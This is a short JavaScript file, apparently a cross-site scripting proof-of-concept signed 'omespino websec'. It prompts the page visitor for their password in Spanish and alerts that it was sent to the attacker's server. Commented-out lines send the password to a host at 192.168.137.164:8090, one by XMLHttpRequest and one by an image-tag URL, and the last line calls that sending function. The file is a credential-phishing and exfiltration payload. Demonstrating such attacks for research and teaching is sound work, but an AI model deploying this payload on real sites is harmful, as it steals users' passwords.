var pass=prompt('Para continuar inserta tu contraseña');
alert('contraseña: ' + pass+ ', enviada al server del atacante ;) - omespino websec');

// function send_response(response){
// 	var oReqX = new XMLHttpRequest();
// 	oReqX.open("GET","https://192.168.137.164:8090/");
// 	oReqX.send(response);
// }
// document.write('<img src=http://192.168.137.164:8090/'+pass+'>');

send_response(pass);

